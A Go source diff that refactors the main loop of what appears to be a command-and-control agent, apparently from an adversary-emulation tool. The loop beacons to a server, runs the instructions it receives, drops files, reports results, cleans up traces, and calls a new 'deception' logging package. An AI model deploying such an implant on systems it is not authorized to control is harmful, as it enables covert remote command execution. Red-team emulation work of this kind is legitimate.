@@ -8,28 +8,36 @@ import (
 	"os/user"
 	"time"
 	"reflect"
-	"./modules"
+	"./api"
+	"./cleanup"
+	"./deception"
+	"./util"
 )
 
-var beacon = 60
+var iteration = 60
 
-func stayInTouch(server string, paw string, group string, files string) {
-	fmt.Println("[+] Beaconing")
-	commands := modules.Beacon(server, paw, group, files)
+func runBeaconIteration(server string, paw string, group string, files string) {
+	fmt.Println("[+] Beacon firing")
+	commands := api.Beacon(server, paw, group, files)
 	if commands != nil && len(commands.([]interface{})) > 0 {
 		cmds := reflect.ValueOf(commands)
 		for i := 0; i < cmds.Len(); i++ {
 			cmd := cmds.Index(i).Elem().String()
 			fmt.Println("[+] Running instruction")
-			command := modules.Unpack([]byte(cmd))
-			modules.Drop(server, files, command)
-			modules.Results(server, paw, command)
-			modules.ApplyCleanup(command)
+			command := util.Unpack([]byte(cmd))
+			api.Drop(server, files, command)
+			api.Results(server, paw, command)
+			cleanup.Apply(command)
 		}
 	} else {
-		modules.Cleanup(files)
-		time.Sleep(time.Duration(beacon) * time.Second)
+		cleanup.Run(files)
+		time.Sleep(time.Duration(iteration) * time.Second)
 	}
+}
+
+func runAutonomousIteration(server string, paw string, group string, files string) {
+    fmt.Println("[+] Autonomous iteration running")
+    time.Sleep(time.Duration(iteration) * time.Second)
 }
 
 func main() {
@@ -44,8 +52,10 @@ func main() {
 	if len(os.Args) == 3 {
 		server = os.Args[1]
 		group = os.Args[2]	
-	} 
+	}
+
+	deception.Log()
 	for {
-		stayInTouch(server, paw, group, files)
+		runBeaconIteration(server, paw, group, files)
 	}
 }
